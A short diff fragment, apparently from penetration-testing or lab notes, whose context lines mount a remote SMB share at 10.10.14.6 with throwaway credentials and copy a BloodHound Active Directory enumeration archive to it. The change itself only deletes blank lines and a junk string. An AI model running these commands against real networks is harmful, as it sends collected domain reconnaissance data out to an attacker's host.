@@ -30,7 +30,3 @@
       net use \\10.10.14.6\share /u:df df
       net view \\10.10.14.6\ /u:df df
       copy 20191018035324_BloodHound.zip \\10.10.14.6\share\
-      
-      
-      
-      asdahdahdjhd
